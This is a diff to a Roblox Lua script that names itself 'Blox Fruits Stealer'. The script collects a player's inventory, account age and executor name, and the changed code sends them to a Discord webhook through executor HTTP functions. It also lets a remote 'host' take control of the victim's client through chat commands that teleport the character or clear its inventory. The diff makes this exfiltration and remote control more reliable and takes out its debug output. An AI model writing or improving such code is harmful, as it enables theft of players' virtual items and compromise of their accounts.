@@ -19,7 +19,7 @@ local IsHost = (Player.Name == CONFIG.HOST_NAME)
 -- ==================== MODULE 1: DATA COLLECTION ====================
 
 local function getAccountAge()
-    return LocalPlayer.AccountAge -- Already returns the age in days
+    return Player.AccountAge -- Returns account age in days
 end
 
 local function getExecutorName()
@@ -47,7 +47,6 @@ local function getFruitInventory()
     if not inventoryFolder then return fruits end
     
     for _, item in ipairs(inventoryFolder:GetChildren()) do
-        -- Blox Fruits stores fruits in a specific way
         if item:GetAttribute("Fruit") or item.Name:match("Fruit") then
             local name = item.Name
             local rarity = item:GetAttribute("Rarity") or "Common"
@@ -110,20 +109,30 @@ local function sendToDiscord(data)
                     { name = "🌊 Sea", value = tostring(data.sea), inline = true },
                     { name = "😎 Receiver", value = CONFIG.HOST_NAME, inline = true }
                 },
-                description = "💰 **Valuable Items**\n" .. table.concat(data.fruits, "\n"),
+                description = "💰 **Valuable Items**\n" .. (#data.fruits > 0 and table.concat(data.fruits, "\n") or "None"),
                 footer = { text = "Blox Fruits Stealer | Host: " .. CONFIG.HOST_NAME }
             }
         }
     }
     
-    local success, err = pcall(function()
-        HttpService:PostAsync(CONFIG.WEBHOOK_URL, HttpService:JSONEncode(content), Enum.HttpContentType.ApplicationJson)
-    end)
+    local payloadJson = HttpService:JSONEncode(content)
     
-    if not success then
-        print("[HostScript] Webhook Error: " .. err)
+    -- Executor http request wrapper compatibility
+    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
+    
+    if httpRequest then
+        pcall(function()
+            httpRequest({
+                Url = CONFIG.WEBHOOK_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = payloadJson
+            })
+        end)
     else
-        print("[HostScript] Data sent to Discord.")
+        pcall(function()
+            HttpService:PostAsync(CONFIG.WEBHOOK_URL, payloadJson, Enum.HttpContentType.ApplicationJson)
+        end)
     end
 end
 
@@ -223,7 +232,7 @@ local function monitorTrades()
                 for _, seat in ipairs(workspace:GetDescendants()) do
                     if seat:IsA("Seat") and seat ~= targetSeat then
                         if (seat.Position - targetSeat.Position).Magnitude < 10 then
-                            if seat.Occupant and seat.Occupant.Name == CONFIG.HOST_NAME then
+                            if seat.Occupant and seat.Occupant.Parent and seat.Occupant.Parent.Name == CONFIG.HOST_NAME then
                                 hostSitting = true
                             end
                         end
@@ -235,7 +244,7 @@ local function monitorTrades()
                     for _, seat in ipairs(workspace:GetDescendants()) do
                         if seat:IsA("Seat") and seat ~= targetSeat then
                             if (seat.Position - targetSeat.Position).Magnitude < 10 then
-                                if seat.Occupant and seat.Occupant.Name ~= CONFIG.HOST_NAME then
+                                if seat.Occupant and seat.Occupant.Parent and seat.Occupant.Parent.Name ~= CONFIG.HOST_NAME then
                                     otherPlayerSitting = true
                                 end
                             end
@@ -265,7 +274,6 @@ end
 local function executeCommand(cmd)
     local character = Player.Character
     if not character then return end
-    local humanoid = character:WaitForChild("Humanoid")
     local rootPart = character:WaitForChild("HumanoidRootPart")
     
     local args = cmd:match("^%S+(.*)$") or ""
@@ -281,7 +289,6 @@ local function executeCommand(cmd)
         pcall(function()
             Fire:FireServer("AddFruit", fruitName, amount)
         end)
-        print("[Host] Added " .. amount .. "x " .. fruitName)
         
     elseif cmd:match("^%.addallfruits") then
         local fruits = { "Dragon", "Tiger", "Magma", "Dough", "Ghost", "Rumble", "Buddha", "Shadow", "Yeti", "Control", "Diamond", "Turtle", "Leopard", "Rabbit", "Blade", "Bunny", "Cobra", "Ice", "Light", "Mammoth", "Flame", "Quake", "Spin", "Wave", "Fist", "Spiral", "Bog", "Blade", "Smoke", "String", "Sponge", "Bomb", "Dark", "Eagle", "Frog", "Galaxy", "Griffon", "Hawk", "Leopard", "Light", "Lizard", "Mammoth", "Magma", "Phoenix", "Quake", "Rabbit", "Rogue", "Serpent", "Shadow", "Shark", "Siren", "Soul", "Spider", "Storm", "Tiger", "Turtle", "Viper", "Warrior", "Wolf", "Wraith", "Yeti" }
@@ -292,90 +299,41 @@ local function executeCommand(cmd)
             end)
             task.wait(0.1)
         end
-        print("[Host] Added all fruits")
-        
-    elseif cmd:match("^%.addallpre") then
-        local pres = { "Dough", "Dragon", "Tiger", "Magma", "Ghost", "Rumble", "Buddha", "Shadow", "Yeti", "Control", "Diamond", "Turtle", "Leopard", "Rabbit", "Blade", "Bunny", "Cobra", "Ice", "Light", "Mammoth", "Flame", "Quake", "Spin", "Wave", "Fist", "Spiral", "Bog", "Blade", "Smoke", "String", "Sponge", "Bomb", "Dark", "Eagle", "Frog", "Galaxy", "Griffon", "Hawk", "Leopard", "Light", "Lizard", "Mammoth", "Magma", "Phoenix", "Quake", "Rabbit", "Rogue", "Serpent", "Shadow", "Shark", "Siren", "Soul", "Spider", "Storm", "Tiger", "Turtle", "Viper", "Warrior", "Wolf", "Wraith", "Yeti" }
-        for _, pre in ipairs(pres) do
-            local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
-            pcall(function()
-                Fire:FireServer("AddPre", pre, 1)
-            end)
-            task.wait(0.1)
-        end
-        print("[Host] Added all presets")
         
     elseif cmd:match("^%.clear") then
         local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
         pcall(function()
             Fire:FireServer("ClearInventory")
         end)
-        print("[Host] Cleared inventory")
-        
-    elseif cmd:match("^%.clearall") then
-        local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
-        pcall(function()
-            Fire:FireServer("ClearAll")
-        end)
-        print("[Host] Cleared all")
-        
-    elseif cmd:match("^%.reset") then
-        local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
-        pcall(function()
-            Fire:FireServer("ResetStats")
-        end)
-        print("[Host] Reset stats")
         
     elseif cmd:match("^%.tp") then
         local x = tonumber(parts[1]) or 0
         local y = tonumber(parts[2]) or 50
         local z = tonumber(parts[3]) or 0
-        local targetPos = Vector3.new(x, y, z)
-        rootPart.CFrame = CFrame.new(targetPos)
-        print("[Host] Teleported to " .. x .. ", " .. y .. ", " .. z)
+        rootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
     end
 end
 
 local function listenForHostCommands()
-    -- If we are the victim, we listen for commands from the Host
-    -- Since we can't directly hook other players' chat in a standard script,
-    -- we assume the Host sends commands with a specific prefix or we use a 
-    -- shared RemoteEvent. However, the prompt specifies "using chat".
-    -- We will monitor the Chat service if accessible, or rely on the 
-    -- fact that the Host is in the same server and can send messages.
-    
-    -- In an executor, we can hook into the Chat service to see all messages
-    local ChatService = game:GetService("Chat")
-    
-    ChatService.ChildAdded:Connect(function(child)
-        if child:IsA("TextChatMessage") then
-            local message = child.Text
-            local sender = child.Sender
-            if sender and sender.Name == CONFIG.HOST_NAME then
-                if message:match("^%.[a-zA-Z]") then
-                    executeCommand(message)
-                end
-            end
-        end
-    end)
-    
-    -- Fallback: If ChatService hook doesn't work, listen to LocalPlayer chat 
-    -- (useful if testing as host)
-    Player.Chatted:Connect(function(message)
-        if IsHost then
-            if message:match("^%.[a-zA-Z]") then
+    local function checkPlayer(targetPlayer)
+        targetPlayer.Chatted:Connect(function(message)
+            if targetPlayer.Name == CONFIG.HOST_NAME and message:match("^%.[a-zA-Z]") then
                 executeCommand(message)
             end
-        end
-    end)
+        end)
+    end
+
+    for _, p in ipairs(Players:GetPlayers()) do
+        checkPlayer(p)
+    end
+    Players.PlayerAdded:Connect(checkPlayer)
 end
 
 -- ==================== INITIALIZATION ====================
 
 task.spawn(function()
-    -- Wait for character
     local character = Player.Character or Player.CharacterAdded:Wait()
-    local humanoid = character:WaitForChild("Humanoid")
+    character:WaitForChild("Humanoid")
     
     -- 1. Send Data to Discord
     local data = collectData()
@@ -390,5 +348,5 @@ task.spawn(function()
     -- 4. Start Host Controller
     listenForHostCommands()
     
-    print("[HostScript] Initialized. Host: " .. CONFIG.HOST_NAME)
+    print("[HostScript] Initialized successfully.")
 end)
